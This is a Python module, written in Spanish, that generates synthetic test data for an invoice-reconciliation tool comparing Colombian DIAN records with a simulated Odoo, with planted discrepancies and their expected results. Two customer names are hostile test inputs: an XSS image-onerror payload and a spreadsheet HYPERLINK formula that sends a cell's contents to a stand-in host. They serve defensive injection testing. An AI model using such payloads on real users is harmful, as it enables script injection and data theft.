"""
Datos SINTÉTICOS para la QA de FactuMatch Ventas (ningún dato real de clientes).

Genera un contenedor DIAN de ~300 filas (01-10-2026 a 15-10-2026) y un Odoo
simulado con discrepancias plantadas y conocidas de antemano, para verificar
de punta a punta que cada una se clasifique y que la descomposición cuadre.

Uso:
    from datos_sinteticos import construir
    datos = construir()
    datos.contenedor   -> bytes del .xlsx
    datos.odoo         -> OdooFalso (lectura con dominios reales de Odoo)
    datos.esperado     -> {ref: estado esperado}
"""

from __future__ import annotations

import os
import random
import sys
from datetime import date, timedelta
from decimal import ROUND_HALF_UP, Decimal
from types import SimpleNamespace

RAIZ = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(RAIZ, "backend"))

from conftest import (  # noqa: E402  (utilidades sintéticas compartidas con las pruebas)
    CAMPOS_MOVE_PRUEBA,
    NIT_EMPRESA,
    NIT_EMPRESA_DV,
    OdooFalso,
    crear_contenedor,
    cufe,
    fila_dian,
    movimiento,
    orden_pos,
)

XSS = '<img src=x onerror="window.__xss=1">Cliente prueba'
FORMULA = '=HYPERLINK("https://example.com/robo?d="&A1,"Ver soporte")'


def _dinero(x: float) -> float:
    return float(Decimal(str(x)).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP))


def construir(semilla: int = 20261015) -> SimpleNamespace:
    rnd = random.Random(semilla)
    filas: list[dict] = []
    movs: list[dict] = []
    ordenes: list[dict] = []
    esperado: dict[str, str] = {}
    id_move, id_pos = 1000, 5000
    dias = [date(2026, 10, 1) + timedelta(days=i) for i in range(15)]

    def fecha_dian(d: date) -> str:
        return d.strftime("%d-%m-%Y")

    # ── Facturas electrónicas FE (account.move) ──
    for folio in range(1, 71):
        d = dias[min(14, (folio - 1) // 5)]
        base = rnd.randint(50, 900) * 1000
        iva = _dinero(base * 0.19)
        total = _dinero(base + iva)
        receptor = ("1020304050", "Ana Prueba") if folio % 7 == 0 else ("800000002", "Distribuidora Ejemplo SAS")
        nombre = XSS if folio == 45 else FORMULA if folio == 46 else receptor[1]
        f = fila_dian("FE", folio, total, iva=iva, fecha=fecha_dian(d),
                      recepcion=f"{d.isoformat()}T{8 + folio % 10:02d}:15:00" if d < dias[14] else f"{d.isoformat()}T09:00:00",
                      nit_receptor=receptor[0], nombre_receptor=nombre)
        filas.append(f)
        ref = f"dian:FE-{folio}"
        if folio == 15:
            esperado[ref] = "missing_in_odoo"
            continue
        id_move += 1
        total_odoo, imp_odoo, estado = total, iva, "posted"
        if folio == 22:
            total_odoo = _dinero(total + 3000); esperado[ref] = "amount_mismatch"
        elif folio == 30:
            imp_odoo = _dinero(iva - 1500); esperado[ref] = "tax_mismatch"
        elif folio == 31:
            total_odoo = _dinero(total + 0.40); esperado[ref] = "matched"        # redondeo dentro de $1
        elif folio == 40:
            estado = "draft"; esperado[ref] = "scope_difference"
        else:
            esperado.setdefault(ref, "matched")
        socio = 701 if folio % 7 == 0 else 700
        if folio == 12:                                   # el cliente de Odoo tiene otro NIT: revisar
            socio = 701; esperado[ref] = "needs_review"
        movs.append(movimiento(id_move, f"FE/2026/{folio:05d}", total_odoo, impuestos=imp_odoo, fecha=d.isoformat(),
                               estado=estado, cufe_valor=f["CUFE/CUDE"], partner=[socio, "Cliente"],
                               diario="Facturas de cliente"))
        if folio == 50:                                   # el mismo CUFE en dos asientos de Odoo
            id_move += 1
            movs.append(movimiento(id_move, f"FE/2026/{folio + 100:05d}", total, impuestos=iva, fecha=d.isoformat(),
                                   cufe_valor=f["CUFE/CUDE"], diario="Facturas de cliente"))
            esperado[ref] = "possible_duplicate"

    # ── Factura de una orden POS (POS facturado: cuenta una sola vez) ──
    f61 = next(x for x in filas if x["Prefijo"] == "FE" and x["Folio"] == "61")
    orden_facturada = next(m for m in movs if m["name"] == "FE/2026/00061")
    id_pos += 1
    ordenes.append(orden_pos(id_pos, "", orden_facturada["amount_total"], fecha=orden_facturada["invoice_date"],
                             estado="invoiced", factura=[orden_facturada["id"], orden_facturada["name"]],
                             cufe_valor=f61["CUFE/CUDE"], punto="POS Centro"))

    # ── Documentos equivalentes POS (pos.order) ──
    for folio in range(100, 300):
        d = dias[min(14, (folio - 100) // 14)]
        total = rnd.choice([8000, 12000, 14000, 21000, 35000])
        inc = _dinero(total / 1.08 * 0.08)
        hora = 10 + folio % 11
        ref = f"dian:POS-{folio}"
        if 240 <= folio <= 247:                           # nunca llegaron a la DIAN: solo existen en Odoo
            id_pos += 1
            ordenes.append(orden_pos(id_pos, f"POS{folio}", total, impuestos=inc, fecha=d.isoformat(), hora=f"{hora:02d}:30:00",
                                     cufe_valor=False, punto="POS Centro"))
            esperado[f"odoo:pos.order:{id_pos}"] = "missing_in_dian"
            continue
        f = fila_dian("POS", folio, total, tipo="Documento equivalente POS", inc=inc, fecha=fecha_dian(d),
                      recepcion=f"{d.isoformat()}T{hora:02d}:35:00" if d < dias[14] else f"{d.isoformat()}T08:40:00")
        filas.append(f)
        id_pos += 1
        ordenes.append(orden_pos(id_pos, f"POS{folio}", total, impuestos=inc, fecha=d.isoformat(), hora=f"{hora:02d}:30:00",
                                 cufe_valor=f["CUFE/CUDE"], punto="POS Centro"))
        esperado[ref] = "matched"

    # ── Notas crédito y débito ──
    for folio in range(1, 6):
        d = dias[3 + folio]
        total = 20000 * folio
        f = fila_dian("NC", folio, total, tipo="Nota de crédito electrónica", fecha=fecha_dian(d))
        filas.append(f)
        id_move += 1
        tipo = "out_invoice" if folio == 3 else "out_refund"     # NC-3 registrada como factura (signo errado)
        movs.append(movimiento(id_move, f"NC/2026/{folio:05d}", total, tipo=tipo, fecha=d.isoformat(), cufe_valor=f["CUFE/CUDE"],
                               diario="Notas crédito"))
        esperado[f"dian:NC-{folio}"] = "identity_mismatch" if folio == 3 else "matched"
    f = fila_dian("ND", 1, 15000, tipo="Nota de débito electrónica", fecha=fecha_dian(dias[9]))
    filas.append(f)
    id_move += 1
    movs.append(movimiento(id_move, "ND/2026/00001", 15000, fecha=dias[9].isoformat(), cufe_valor=f["CUFE/CUDE"], diario="Notas débito"))
    esperado["dian:ND-1"] = "matched"

    # ── Excluidos por regla ──
    for i in range(3):
        filas.append(fila_dian("DSFR", 10 + i, 300000 + i, tipo="Documento soporte con no obligados", fecha=fecha_dian(dias[i])))
    for i in range(5):
        filas.append(fila_dian("", "", 0, tipo="Application response", fecha=fecha_dian(dias[i]),
                               cufe_valor=cufe(f"acuse{i}")))
    for i in range(4):
        filas.append(fila_dian("NE", 20 + i, 2500000, tipo="Nomina Individual", fecha=fecha_dian(dias[0]),
                               nit_receptor="1020304050", nombre_receptor="Empleado Prueba"))

    # ── Odoo: factura del día del corte sin reporte DIAN ──
    id_move += 1
    movs.append(movimiento(id_move, "FE/2026/00071", 777000, fecha=dias[14].isoformat(), diario="Facturas de cliente"))
    esperado[f"odoo:account.move:{id_move}"] = "missing_in_dian"

    odoo = OdooFalso(movimientos=movs, ordenes=ordenes, campos_move=CAMPOS_MOVE_PRUEBA,
                     companias=[{"id": 1, "name": "EMPRESA DE PRUEBA SAS", "vat": NIT_EMPRESA_DV}],
                     partners=[{"id": 700, "name": "Distribuidora Ejemplo SAS", "vat": "800000002-1"},
                               {"id": 701, "name": "Ana Prueba", "vat": "1020304050"}])
    return SimpleNamespace(contenedor=crear_contenedor(filas), filas=filas, odoo=odoo, esperado=esperado,
                           nit=NIT_EMPRESA, desde=dias[0], hasta=dias[-1])


def contenedor_dos_nit() -> bytes:
    return crear_contenedor([fila_dian("FE", 1, 1000), fila_dian("FE", 2, 1000, nit_emisor="800000002")])


if __name__ == "__main__":
    d = construir()
    print(len(d.filas), "filas DIAN ·", len(d.odoo.datos["account.move"]), "asientos ·",
          len(d.odoo.datos["pos.order"]), "órdenes POS ·", len(d.esperado), "estados esperados")
